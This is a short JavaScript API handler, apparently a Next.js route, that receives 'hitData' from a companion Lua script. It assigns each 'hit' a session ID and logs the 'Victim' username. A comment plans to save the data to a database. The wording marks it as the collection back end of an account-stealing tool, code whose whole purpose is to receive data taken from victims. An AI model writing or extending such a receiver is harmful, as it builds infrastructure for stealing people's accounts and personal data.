import crypto from 'crypto';

export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { hitData } = req.body;

  if (!hitData) {
    return res.status(400).json({ success: false, error: 'Missing hitData' });
  }

  // Generate a unique session ID for this hit
  const sessionId = crypto.randomUUID();

  // Here is where you'd normally save `hitData` to a database like MongoDB.
  // For now, we're just accepting it and returning the session ID so the Lua script continues.

  console.log(`[+] New hit registered! Session: ${sessionId} | Victim: ${hitData.username}`);

  return res.status(200).json({
    success: true,
    sessionId: sessionId
  });
}
